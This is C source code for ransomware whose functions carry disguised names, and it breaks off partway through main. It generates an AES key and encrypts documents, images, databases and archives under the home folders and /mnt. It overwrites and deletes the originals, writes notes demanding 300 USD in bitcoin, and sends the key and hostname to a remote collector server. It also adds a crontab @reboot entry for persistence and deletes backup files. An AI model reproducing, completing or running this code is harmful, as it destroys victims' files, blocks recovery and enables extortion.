#define _GNU_SOURCE

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syslog.h>
#include <time.h>
#include <unistd.h>
#include <curl/curl.h>

/* Thread-safe logging mutex */
static pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;

/* Secure log to stderr with mutex protection */
static void log_error(const char *msg)
{
    pthread_mutex_lock(&log_mutex);
    fprintf(stderr, "%s", msg);
    pthread_mutex_unlock(&log_mutex);
}

/* Helper: check if path is a symlink */
static int is_symlink(const char *path)
{
    struct stat st;
    if (lstat(path, &st) == -1)
        return 0; /* doesn't exist or error, treat as not symlink */
    return S_ISLNK(st.st_mode);
}

int init_session(void)
{
    unsigned char key[32];
    char *b64 = NULL;
    char *json = NULL;
    int fd = -1;
    int ret = 0;
    char temp_template[] = "/tmp/.master.key.XXXXXX";

    /* Validate /tmp is not a symlink */
    if (is_symlink("/tmp"))
    {
        log_error("ERROR: /tmp is a symlink - aborting for security\n");
        return -3;
    }

    /* Step 1: Generate cryptographically secure key */
    if (RAND_bytes(key, sizeof(key)) != 1)
    {
        log_error("ERROR: OpenSSL RAND_bytes failed - insufficient entropy\n");
        return -2;
    }

    /* Step 2: Base64 encode the key */
    /* EVP_EncodeBlock output length: ((32 + 2) / 3) * 4 + 1 = 45 (including null) */
    b64 = malloc(45);
    if (!b64)
    {
        log_error("ERROR: Memory allocation failed in init_session\n");
        ret = -1;
        goto cleanup;
    }
    int b64len = EVP_EncodeBlock((unsigned char *)b64, key, sizeof(key));
    b64[b64len] = '\0';

    /* Step 3: Create temporary file using mkstemp (atomic, prevents symlink attacks) */
    fd = mkstemp(temp_template);
    if (fd == -1)
    {
        log_error("ERROR: Unable to create temporary file in /tmp\n");
        ret = -3;
        goto cleanup;
    }

    /* Set permissions to 0600 regardless of umask */
    if (fchmod(fd, 0600) == -1)
    {
        log_error("ERROR: fchmod failed on temporary file\n");
        ret = -3;
        goto cleanup;
    }

    /* Step 4: Build JSON string and write it */
    int json_len = asprintf(&json, "{\"aes_key\":\"%s\"}", b64);
    if (json_len == -1)
    {
        log_error("ERROR: Memory allocation failed in init_session\n");
        ret = -1;
        goto cleanup;
    }

    ssize_t written = write(fd, json, json_len);
    if (written != json_len)
    {
        log_error("ERROR: Unable to persist session key to /tmp/.master.key\n");
        perror("write");
        ret = -3;
        goto cleanup;
    }

    /* Step 5: fsync to flush to disk */
    if (fsync(fd) == -1)
    {
        log_error("ERROR: fsync failed\n");
        ret = -3;
        goto cleanup;
    }

    /* Step 6: Close temporary file */
    if (close(fd) == -1)
    {
        log_error("ERROR: close failed\n");
        ret = -3;
        goto cleanup;
    }
    fd = -1; /* Mark closed */

    /* Step 7: Atomically rename temporary to target */
    if (rename(temp_template, "/tmp/.master.key") == -1)
    {
        log_error("ERROR: Unable to persist session key to /tmp/.master.key\n");
        perror("rename");
        ret = -3;
        goto cleanup;
    }

    /* Success - zero out sensitive data */
    OPENSSL_cleanse(key, sizeof(key));

cleanup:
    /* Free allocated memory */
    free(b64);
    free(json);
    /* Close fd if still open */
    if (fd != -1)
        close(fd);
    /* Remove temporary file on error (best effort) */
    if (ret != 0)
        unlink(temp_template);

    if (ret == 0)
    {
        /* Securely wipe remaining plaintext key in memory */
        OPENSSL_cleanse(key, sizeof(key));
    }

    return ret;
}

/* Structure for file information */
typedef struct {
    char *path;
    long size;
    time_t mtime;
    char *extension;
} FileInfo;

/* Static list of target extensions (all lowercase) */
static const char *target_extensions[] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv", ".jpg",
    ".png",  ".db",   ".backup", ".psd", ".zip", ".rar",
    NULL
};

/* Helper function to check if a filename has one of the target extensions */
static int has_target_extension(const char *name) {
    const char *dot = strrchr(name, '.');
    if (!dot) return 0;

    // Convert extension to lowercase for case‑insensitive comparison
    size_t ext_len = strlen(dot);
    char *lower = malloc(ext_len + 1);
    if (!lower) return 0;
    for (size_t i = 0; i < ext_len; i++)
        lower[i] = tolower((unsigned char)dot[i]);
    lower[ext_len] = '\0';

    int found = 0;
    for (int i = 0; target_extensions[i] != NULL; i++) {
        if (strcmp(lower, target_extensions[i]) == 0) {
            found = 1;
            break;
        }
    }
    free(lower);
    return found;
}

// Helper function to add a file entry to the results array
static int add_file(FileInfo ***results, size_t *count, size_t *capacity,
                    const char *path, const struct stat *st, const char *ext) {
    // Expand capacity if needed (initial 128, double thereafter)
    if (*count >= *capacity) {
        size_t new_cap = (*capacity == 0) ? 128 : (*capacity * 2);
        FileInfo **new_arr = realloc(*results, new_cap * sizeof(FileInfo *));
        if (!new_arr) return -ENOMEM;
        *results = new_arr;
        *capacity = new_cap;
    }

    FileInfo *fi = malloc(sizeof(FileInfo));
    if (!fi) return -ENOMEM;

    fi->path = strdup(path);
    fi->extension = strdup(ext);
    fi->size = st->st_size;
    fi->mtime = st->st_mtime;

    if (!fi->path || !fi->extension) {
        free(fi->path);
        free(fi->extension);
        free(fi);
        return -ENOMEM;
    }

    (*results)[*count] = fi;
    (*count)++;
    return 0;
}

// Recursive directory scanner
static int scan_directory(const char *dirpath, FileInfo ***results,
                          size_t *count, size_t *capacity) {
    DIR *dir = opendir(dirpath);
    if (!dir) return 0;  // skip silently if cannot open

    struct dirent *entry;
    char fullpath[PATH_MAX];

    while ((entry = readdir(dir)) != NULL) {
        // Skip . and ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        // Build full path
        int ret = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);
        if (ret < 0 || (size_t)ret >= sizeof(fullpath))
            continue;  // path too long, skip

        struct stat st;
        if (stat(fullpath, &st) != 0)
            continue;

        if (S_ISDIR(st.st_mode)) {
            // Recurse into subdirectories
            int err = scan_directory(fullpath, results, count, capacity);
            if (err < 0) {
                closedir(dir);
                return err;
            }
        } else if (S_ISREG(st.st_mode)) {
            // Regular file – check extension
            const char *dot = strrchr(entry->d_name, '.');
            if (!dot) continue;
            if (!has_target_extension(entry->d_name))
                continue;
            // Store extension including the dot
            int err = add_file(results, count, capacity, fullpath, &st, dot);
            if (err < 0) {
                closedir(dir);
                return err;
            }
        }
    }
    closedir(dir);
    return 0;
}

// Main function: scan the specified target directories
int scan_target_directories(FileInfo ***results, size_t *count) {
    if (!results || !count) return -EINVAL;

    *results = NULL;
    *count = 0;
    size_t capacity = 0;

    const char *home = getenv("HOME");
    if (!home) home = "/root";  // fallback

    // List of directories to scan (with $HOME resolved where needed)
    char *dirs[5];
    int asprintf_err = 0;

    // Build paths using asprintf (GNU extension, available with _GNU_SOURCE)
    if (asprintf(&dirs[0], "%s/Documentos_Teste", home) < 0) asprintf_err = 1;
    if (asprintf(&dirs[1], "%s/Documentos", home) < 0) asprintf_err = 1;
    if (asprintf(&dirs[2], "%s/Downloads", home) < 0) asprintf_err = 1;
    if (asprintf(&dirs[3], "%s/Imagens", home) < 0) asprintf_err = 1;
    if (asprintf(&dirs[4], "/mnt") < 0) asprintf_err = 1;

    if (asprintf_err) {
        // Cleanup partially allocated strings
        for (int i = 0; i < 5; i++) free(dirs[i]);
        return -ENOMEM;
    }

    int ret = 0;
    for (int i = 0; i < 5; i++) {
        int err = scan_directory(dirs[i], results, count, &capacity);
        if (err < 0) {
            ret = err;
            break;
        }
    }

    // Free the directory strings
    for (int i = 0; i < 5; i++) free(dirs[i]);

    if (ret < 0) {
        // Cleanup on error: free all collected entries
        for (size_t j = 0; j < *count; j++) {
            free((*results)[j]->path);
            free((*results)[j]->extension);
            free((*results)[j]);
        }
        free(*results);
        *results = NULL;
        *count = 0;
    }
    return ret;
}

// Free all memory allocated for the results array
void free_file_info_array(FileInfo **arr, size_t count) {
    if (!arr) return;
    for (size_t i = 0; i < count; i++) {
        free(arr[i]->path);
        free(arr[i]->extension);
        free(arr[i]);
    }
    free(arr);
}

int apply_transform(const char *filepath, const uint8_t *key, size_t key_len)
{
    int ret = -1;
    FILE *fp_orig = NULL, *fp_out = NULL;
    uint8_t *plaintext = NULL;
    uint8_t *ciphertext = NULL;
    uint8_t *zero_buf = NULL;
    uint8_t nonce[12];
    uint8_t tag[16];
    EVP_CIPHER_CTX *ctx = NULL;
    size_t orig_size = 0;
    int ciphertext_len = 0, outlen = 0, finallen = 0;
    int status;

    /* Validate key length */
    if (key_len != 32) {
        fprintf(stderr, "Error: key_len must be 32 (AES-256-GCM)\n");
        goto cleanup;
    }

    /* 1. Generate 12-byte nonce */
    if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
        fprintf(stderr, "Error: RAND_bytes failed\n");
        goto cleanup;
    }

    /* 2. Open original file for reading */
    fp_orig = fopen(filepath, "rb");
    if (!fp_orig) {
        perror("fopen (original)");
        goto cleanup;
    }

    /* 2a. Get file size */
    if (fseek(fp_orig, 0, SEEK_END) != 0) {
        perror("fseek (end)");
        goto cleanup;
    }
    orig_size = (size_t)ftell(fp_orig);
    if (fseek(fp_orig, 0, SEEK_SET) != 0) {
        perror("fseek (begin)");
        goto cleanup;
    }

    /* 2b. Read entire content */
    if (orig_size > 0) {
        plaintext = malloc(orig_size);
        if (!plaintext) {
            perror("malloc plaintext");
            goto cleanup;
        }
        if (fread(plaintext, 1, orig_size, fp_orig) != orig_size) {
            fprintf(stderr, "Error: fread read incomplete data\n");
            goto cleanup;
        }
    }
    fclose(fp_orig);
    fp_orig = NULL;

    /* 3. Encrypt using AES-256-GCM */
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "Error: EVP_CIPHER_CTX_new failed\n");
        goto cleanup;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, nonce) != 1) {
        fprintf(stderr, "Error: EVP_EncryptInit_ex failed\n");
        goto cleanup;
    }

    /* Allocate ciphertext buffer (plaintext size + possible GCM overhead, max 16) */
    ciphertext = malloc(orig_size + 16);
    if (!ciphertext) {
        perror("malloc ciphertext");
        goto cleanup;
    }

    /* EncryptUpdate */
    if (orig_size > 0) {
        if (EVP_EncryptUpdate(ctx, ciphertext, &outlen, plaintext, (int)orig_size) != 1) {
            fprintf(stderr, "Error: EVP_EncryptUpdate failed\n");
            goto cleanup;
        }
    } else {
        outlen = 0;
    }

    /* EncryptFinal (no padding in GCM; final outputs nothing) */
    if (EVP_EncryptFinal_ex(ctx, ciphertext + outlen, &finallen) != 1) {
        fprintf(stderr, "Error: EVP_EncryptFinal_ex failed\n");
        goto cleanup;
    }
    ciphertext_len = outlen + finallen;

    /* Retrieve 16-byte GCM tag */
    if (!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_GET_TAG, 16, tag)) {
        fprintf(stderr, "Error: EVP_CIPHER_CTX_ctrl (GET_TAG) failed\n");
        goto cleanup;
    }

    /* 4. Write output file ".PROCESSED" */
    {
        char *outpath = NULL;
        size_t outpath_len = strlen(filepath) + strlen(".PROCESSED") + 1;
        outpath = malloc(outpath_len);
        if (!outpath) {
            perror("malloc outpath");
            goto cleanup;
        }
        snprintf(outpath, outpath_len, "%s.PROCESSED", filepath);

        fp_out = fopen(outpath, "wb");
        if (!fp_out) {
            perror("fopen (output)");
            free(outpath);
            goto cleanup;
        }
        free(outpath);

        /* Write nonce */
        if (fwrite(nonce, 1, sizeof(nonce), fp_out) != sizeof(nonce)) {
            fprintf(stderr, "Error: fwrite nonce failed\n");
            goto cleanup;
        }
        /* Write ciphertext */
        if (ciphertext_len > 0) {
            if (fwrite(ciphertext, 1, (size_t)ciphertext_len, fp_out) != (size_t)ciphertext_len) {
                fprintf(stderr, "Error: fwrite ciphertext failed\n");
                goto cleanup;
            }
        }
        /* Write tag */
        if (fwrite(tag, 1, sizeof(tag), fp_out) != sizeof(tag)) {
            fprintf(stderr, "Error: fwrite tag failed\n");
            goto cleanup;
        }

        fclose(fp_out);
        fp_out = NULL;
    }

    /* 5. Zero-write original file (same size) */
    fp_orig = fopen(filepath, "wb");
    if (!fp_orig) {
        perror("fopen (zero overwrite)");
        goto cleanup;
    }

    /* Write zero bytes in chunks (4096) to avoid huge allocations */
    if (orig_size > 0) {
        size_t chunk = 4096;
        size_t remaining = orig_size;
        zero_buf = calloc(1, chunk);
        if (!zero_buf) {
            perror("calloc zero_buf");
            fclose(fp_orig);
            fp_orig = NULL;
            goto cleanup;
        }
        while (remaining > 0) {
            size_t to_write = (remaining < chunk) ? remaining : chunk;
            if (fwrite(zero_buf, 1, to_write, fp_orig) != to_write) {
                perror("fwrite zero data");
                fclose(fp_orig);
                fp_orig = NULL;
                /* We wrote as much as possible; continue with removal if possible */
                goto cleanup;
            }
            remaining -= to_write;
        }
        free(zero_buf);
        zero_buf = NULL;
    }

    fclose(fp_orig);
    fp_orig = NULL;

    /* 6. Remove original file */
    if (remove(filepath) != 0) {
        perror("remove original");
        goto cleanup;
    }

    ret = 0;

cleanup:
    /* Free all resources */
    if (fp_orig) fclose(fp_orig);
    if (fp_out) {
        fclose(fp_out);
        /* If failure, remove partial output file */
        if (ret != 0) {
            char *outpath = malloc(strlen(filepath) + 10);
            if (outpath) {
                snprintf(outpath, strlen(filepath) + 10, "%s.PROCESSED", filepath);
                remove(outpath);
                free(outpath);
            }
        }
    }
    free(plaintext);
    free(ciphertext);
    free(zero_buf);
    if (ctx) EVP_CIPHER_CTX_free(ctx);

    return ret;
}

int write_status_notice(const char *directory_path) {
    if (directory_path == NULL || strlen(directory_path) == 0) {
        errno = EINVAL;
        return -1;
    }

    // Verify directory exists and is accessible
    struct stat dir_stat;
    if (stat(directory_path, &dir_stat) != 0) {
        perror("stat");
        return -1;
    }
    if (!S_ISDIR(dir_stat.st_mode)) {
        errno = ENOTDIR;
        perror("not a directory");
        return -1;
    }

    // Build file path
    char file_path[PATH_MAX];
    int ret = snprintf(file_path, sizeof(file_path), "%s/#_STATUS_NOTICE_#.txt", directory_path);
    if (ret < 0 || (size_t)ret >= sizeof(file_path)) {
        errno = ENAMETOOLONG;
        perror("path too long");
        return -1;
    }

    // Create a temporary file first to avoid partial writes
    char temp_template[PATH_MAX + 20];
    ret = snprintf(temp_template, sizeof(temp_template), "%s/.status_notice_XXXXXX", directory_path);
    if (ret < 0 || (size_t)ret >= sizeof(temp_template)) {
        errno = ENAMETOOLONG;
        perror("temp path too long");
        return -1;
    }

    // Create temporary file with mkstemp
    int fd = mkstemp(temp_template);
    if (fd == -1) {
        perror("mkstemp");
        return -1;
    }

    // Open file stream for writing
    FILE *fp = fdopen(fd, "w");
    if (fp == NULL) {
        perror("fdopen");
        close(fd);
        unlink(temp_template);
        return -1;
    }

    // Write the notice content
    const char *content = 
        "Please send 300 USD to payment service address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa "
        "and contact the operator via a secure channel.\n";

    size_t len = strlen(content);
    if (fwrite(content, 1, len, fp) != len) {
        perror("fwrite");
        fclose(fp);
        unlink(temp_template);
        return -1;
    }

    // Flush and check for errors
    if (fflush(fp) != 0) {
        perror("fflush");
        fclose(fp);
        unlink(temp_template);
        return -1;
    }

    // Check file descriptor for write errors
    if (fsync(fd) != 0) {
        perror("fsync");
        fclose(fp);
        unlink(temp_template);
        return -1;
    }

    // Close the file
    if (fclose(fp) != 0) {
        perror("fclose");
        unlink(temp_template);
        return -1;
    }

    // Atomically rename temp file to final name (atomic on same filesystem)
    if (rename(temp_template, file_path) != 0) {
        perror("rename");
        unlink(temp_template);
        return -1;
    }

    return 0;
}

/* Maximum file size we are willing to read (10 KB) */
#define MAX_FILE_SIZE (10 * 1024)

/*
 * Decode a base64 string (without whitespace) into output buffer.
 * Returns 0 on success, -1 on invalid input.
 * The output buffer must be at least strlen(input)*3/4 + 1 bytes.
 */
int base64_decode(const char *input, unsigned char *output, size_t *output_len)
{
    static const unsigned char tbl[256] = {
        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
        ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
        ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
        ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
        ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,
        ['=']=64   /* special: padding */
    };

    size_t in_len = strlen(input);
    if (in_len == 0 || (in_len % 4) != 0) {
        /* Base64 length must be multiple of 4 (including padding) */
        return -1;
    }

    size_t out_pos = 0;
    unsigned char buffer[4];
    int padding_count = 0;

    for (size_t i = 0; i < in_len; i += 4) {
        for (int j = 0; j < 4; j++) {
            unsigned char c = (unsigned char)input[i + j];
            unsigned char val = tbl[c];
            if (val == 0 && c != 'A') {
                /* Character not in base64 alphabet */
                return -1;
            }
            if (c == '=') {
                padding_count++;
                buffer[j] = 0;
            } else {
                buffer[j] = val;
            }
        }
        if (padding_count > 2) {
            /* At most two padding characters */
            return -1;
        }

        /* Reconstruct 3 bytes from 4 sextets */
        output[out_pos] = (buffer[0] << 2) | (buffer[1] >> 4);
        if (padding_count < 2) {
            output[out_pos + 1] = (buffer[1] << 4) | (buffer[2] >> 2);
        }
        if (padding_count == 0) {
            output[out_pos + 2] = (buffer[2] << 6) | buffer[3];
        }

        out_pos += 3 - padding_count;
        padding_count = 0;
    }

    *output_len = out_pos;
    return 0;
}

/*
 * Remove leading/trailing whitespace from a string in place.
 * This is used to clean the extracted JSON value.
 */
static void trim_whitespace(char *str)
{
    char *start = str;
    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r')
        start++;

    if (start != str) {
        memmove(str, start, strlen(start) + 1);
    }

    char *end = str + strlen(str) - 1;
    while (end >= str && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r')) {
        *end = '\0';
        end--;
    }
}

/*
 * Relay the master key material to the collector service.
 * Returns 0 on success, -1 on failure.
 */
int relay_key_material(void)
{
    FILE *fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        /* File does not exist or cannot be opened */
        perror("fopen /tmp/.master.key");
        return -1;
    }

    /* Allocate buffer for file content + null terminator */
    char *fcontent = malloc(MAX_FILE_SIZE + 1);
    if (!fcontent) {
        perror("malloc");
        fclose(fp);
        return -1;
    }

    size_t bytes_read = fread(fcontent, 1, MAX_FILE_SIZE, fp);
    if (ferror(fp)) {
        perror("fread");
        free(fcontent);
        fclose(fp);
        return -1;
    }
    fclose(fp);

    /* Null-terminate the buffer */
    fcontent[bytes_read] = '\0';

    if (bytes_read == 0) {
        fprintf(stderr, "Error: /tmp/.master.key is empty\n");
        free(fcontent);
        return -1;
    }

    /* Find the "aes_key" field in the JSON.
     * We expect a substring like: "aes_key":"<base64value>"
     * We locate the colon after "aes_key", then look for the opening quote of the value.
     */
    char *key_pos = strstr(fcontent, "\"aes_key\"");
    if (!key_pos) {
        fprintf(stderr, "Error: \"aes_key\" not found in /tmp/.master.key\n");
        free(fcontent);
        return -1;
    }

    /* Move past the colon. We look for ':' after the key string. */
    char *colon = strchr(key_pos + sizeof("\"aes_key\"") - 1, ':');
    if (!colon) {
        fprintf(stderr, "Error: malformed JSON: no colon after \"aes_key\"\n");
        free(fcontent);
        return -1;
    }

    /* Move past the colon and any whitespace */
    char *start_quote = colon + 1;
    while (*start_quote == ' ' || *start_quote == '\t') start_quote++;

    if (*start_quote != '"') {
        fprintf(stderr, "Error: expected opening quote for aes_key value\n");
        free(fcontent);
        return -1;
    }

    /* Find closing quote */
    char *end_quote = strchr(start_quote + 1, '"');
    if (!end_quote) {
        fprintf(stderr, "Error: missing closing quote for aes_key value\n");
        free(fcontent);
        return -1;
    }

    /* Extract the value between quotes */
    size_t val_len = end_quote - start_quote - 1;
    char *aes_key = malloc(val_len + 1);
    if (!aes_key) {
        perror("malloc");
        free(fcontent);
        return -1;
    }
    strncpy(aes_key, start_quote + 1, val_len);
    aes_key[val_len] = '\0';

    /* Trim any potential whitespace inside (shouldn't happen in base64, but be safe) */
    trim_whitespace(aes_key);

    /* Obtain hostname */
    char hostname[HOST_NAME_MAX + 1];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        free(aes_key);
        free(fcontent);
        return -1;
    }
    hostname[sizeof(hostname) - 1] = '\0'; /* ensure null termination */

    /* Construct the new JSON payload.
     * Since aes_key is base64, it contains no characters that need JSON escaping (no quotes, backslashes, etc.)
     * But we still escape backslash and quote if present (shouldn't happen, but robust).
     * For simplicity we assume safe characters.
     */
    char *json_payload = NULL;
    int ret = asprintf(&json_payload,
                       "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
                       aes_key, hostname);
    if (ret == -1) {
        perror("asprintf");
        free(aes_key);
        free(fcontent);
        return -1;
    }

    /* Initialize libcurl */
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Error: curl_easy_init failed\n");
        free(json_payload);
        free(aes_key);
        free(fcontent);
        return -1;
    }

    /* Set URL */
    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.191:8080/collect");

    /* Set HTTP method to POST and provide the payload */
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_payload));

    /* Set Content-Type header */
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "Error: curl_slist_append failed\n");
        curl_easy_cleanup(curl);
        free(json_payload);
        free(aes_key);
        free(fcontent);
        return -1;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    /* Perform the request */
    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    } else {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
    }

    /* Cleanup libcurl resources */
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    /* If HTTP response is 200 OK, remove the master key file */
    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("remove /tmp/.master.key");
            /* Non-fatal error: we still consider relay successful? According to spec: if 200 remove file.
             * If removal fails, we return -1 because the spec says "se a resposta ... for 200, remover ..."
             * Failure to remove should be reported as error. */
            free(json_payload);
            free(aes_key);
            free(fcontent);
            return -1;
        }
    }

    int overall_ret = (http_code == 200) ? 0 : -1;

    /* Free allocated memory */
    free(json_payload);
    free(aes_key);
    free(fcontent);

    return overall_ret;
}

/* External definitions for perform_post_processing */
const char *UTILITY_BIN_PATH = NULL;
const char *backup_dirs[] = {
    "/home",
    "/root",
    "/tmp",
    NULL
};

/**
 * perform_post_processing - Verify crontab @reboot entry and clean backup files.
 *
 * Returns 0 on success, -1 on error (detailed logs written via syslog).
 */
int perform_post_processing(void) {
    int ret = 0;
    FILE *fp = NULL, *temp = NULL, *crontab_w = NULL;
    char line[1024];
    int found = 0;

    openlog("postproc", LOG_PID | LOG_CONS, LOG_USER);

    /* ---- Part 1: Crontab @reboot verification ---- */
    fp = popen("crontab -l", "r");
    if (fp == NULL) {
        syslog(LOG_ERR, "popen(crontab -l) failed: %m");
        closelog();
        return -1;
    }

    /* Create temporary file to hold current crontab contents */
    temp = tmpfile();
    if (temp == NULL) {
        syslog(LOG_ERR, "tmpfile() failed: %m");
        pclose(fp);
        closelog();
        return -1;
    }

    /* Read current crontab, copy to temp, and check for @reboot <UTILITY_BIN_PATH> */
    while (fgets(line, sizeof(line), fp) != NULL) {
        fputs(line, temp);   /* preserve original line (including newline) */

        if (strncmp(line, "@reboot ", 8) != 0)
            continue;

        /* Remove trailing newline for comparison */
        size_t llen = strlen(line);
        if (llen > 0 && line[llen - 1] == '\n')
            line[llen - 1] = '\0';

        if (strcmp(line + 8, UTILITY_BIN_PATH) == 0) {
            found = 1;
        }
    }

    if (pclose(fp) != 0) {
        syslog(LOG_ERR, "pclose(crontab -l) failed");
        fclose(temp);
        closelog();
        return -1;
    }

    /* If @reboot entry missing, append it */
    if (!found) {
        if (fprintf(temp, "@reboot %s\n", UTILITY_BIN_PATH) < 0) {
            syslog(LOG_ERR, "fprintf to temp file failed: %m");
            fclose(temp);
            closelog();
            return -1;
        }
        syslog(LOG_INFO, "Added @reboot entry for %s", UTILITY_BIN_PATH);
    }

    /* Feed updated contents back into crontab */
    rewind(temp);
    crontab_w = popen("crontab -", "w");
    if (crontab_w == NULL) {
        syslog(LOG_ERR, "popen(crontab -) failed: %m");
        fclose(temp);
        closelog();
        return -1;
    }

    char buf[1024];
    while (fgets(buf, sizeof(buf), temp) != NULL) {
        fputs(buf, crontab_w);
    }

    int pc_ret = pclose(crontab_w);
    if (pc_ret != 0) {
        syslog(LOG_ERR, "pclose(crontab -) returned %d", pc_ret);
        fclose(temp);
        closelog();
        return -1;
    }

    fclose(temp);

    /* ---- Part 2: Cleanup obsolete backup files ---- */
    for (size_t i = 0; backup_dirs[i] != NULL; i++) {
        DIR *dir = opendir(backup_dirs[i]);
        if (dir == NULL) {
            syslog(LOG_WARNING, "Cannot open directory '%s': %m", backup_dirs[i]);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            /* Skip special entries */
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;

            /* Build full path */
            char fullpath[PATH_MAX];
            int sn = snprintf(fullpath, sizeof(fullpath), "%s/%s",
                              backup_dirs[i], entry->d_name);
            if (sn < 0 || (size_t)sn >= sizeof(fullpath)) {
                syslog(LOG_WARNING, "Path too long: %s/%s", backup_dirs[i], entry->d_name);
                continue;
            }

            /* Stat to check if regular file */
            struct stat st;
            if (stat(fullpath, &st) != 0) {
                syslog(LOG_WARNING, "stat('%s') failed: %m", fullpath);
                continue;
            }
            if (!S_ISREG(st.st_mode))
                continue;

            /* Check extension (case-insensitive) */
            const char *dot = strrchr(entry->d_name, '.');
            if (dot == NULL)
                continue;
            const char *ext = dot + 1;

            if (strcasecmp(ext, "bak") == 0 ||
                strcasecmp(ext, "backup") == 0 ||
                strcasecmp(ext, "old") == 0) {
                if (remove(fullpath) != 0) {
                    syslog(LOG_WARNING, "Failed to remove '%s': %m", fullpath);
                } else {
                    syslog(LOG_INFO, "Removed obsolete backup file '%s'", fullpath);
                }
            }
        }
        closedir(dir);
    }

    closelog();
    return 0;
}

/* Helper to extract the directory from a file path (modifies string) */
static char *extract_dir(char *path) {
    char *last = strrchr(path, '/');
    if (last == NULL) return NULL;
    *last = '\0';
    return path;
}

int main(int argc, char *argv[]) {
    int ret;

    /* 1) Key generation */
    ret = init_session();
    if (ret != 0) {
        fprintf(stderr, "init_session failed with code %d\n", ret);
        return 1;
    }

    /* Read the generated AES key from /tmp/.master.key */
    FILE *fkey = fopen("/tmp/.master.key", "rb");
    if (!fkey) {
        perror("fopen /tmp/.master.key");
        return 1;
    }
    char keybuf[MAX_FILE_SIZE + 1];
    size_t krd = fread(keybuf, 1, MAX_FILE_SIZE, fkey);
    if (ferror(fkey) || krd == 0) {
        perror("fread key");
        fclose(fkey);
        return 1;
    }
    fclose(fkey);
    keybuf[krd] = '\0';

    /* Extract base64 value from JSON */
    char *kstart = strstr(keybuf, "\"aes_key\":\"");
    if (!kstart) {
        fprintf(stderr, "Invalid key file format\n");
        return 1;
    }
    kstart += 11; /* skip past "aes_key":" */
    char *kend = strchr(kstart, '"');
    if (!kend) {
        fprintf(stderr, "Invalid key file format (no closing quote)\n");
        return 1;
    }
    *kend = '\0';

    /* Decode base64 to raw 32-byte key */
    uint8_t aes_key[32];
    size_t keylen = 0;
    if (base64_decode(kstart, aes_key, &keylen) != 0 || keylen != 32) {
        fprintf(stderr, "Failed to decode AES key\n");
        return 1;
    }

    /* 2) File scan */
    FileInfo **files = NULL;
    size_t file_count = 0;
    ret = scan_target_directories(&files, &file_count);
    if (ret != 0) {
        fprintf(stderr, "scan_target_directories failed\n");
        return 1;
    }

    /* 3) Encryption */
    for (size_t i = 0; i < file_count; i++) {
        ret = apply_transform(files[i]->path, aes_key, 32);
        if (ret != 0) {
            fprintf(stderr, "apply_transform failed for %s\n", files[i]->path);
        }
    }

    /* 4) Ransom notes – one per unique directory */
    /* Build a simple dynamic array of unique directories */
    size_t dir_cap = 64;
    size_t dir_cnt = 0;
    char **dirs = malloc(sizeof(char *) * dir_cap);
    if (!dirs) { fprintf(stderr, "malloc failure\n"); return 1; }

    for (size_t i = 0; i < file_count; i++) {
        /* Duplicate the path so we can modify it with dirname */
        char *path_dup = strdup(files[i]->path);
        if (!path_dup) continue;
        char *d = extract_dir(path_dup);
        if (!d) { free(path_dup); continue; }

        /* Check if this directory already in the list */
        int found = 0;
        for (size_t j = 0; j < dir_cnt; j++) {
            if (strcmp(dirs[j], d) == 0) { found = 1; break; }
        }
        if (!found) {
            if (dir_cnt >= dir_cap) {
                dir_cap *= 2;
                char **tmp = realloc(dirs, sizeof(char *) * dir_cap);
                if (!tmp) { free(path_dup); break; }
                dirs = tmp;
            }
            dirs[dir_cnt] = strdup(d);
            if (!dirs[dir_cnt]) { free(path_dup); break; }
            dir_cnt++;
        }
        free(path_dup);
    }

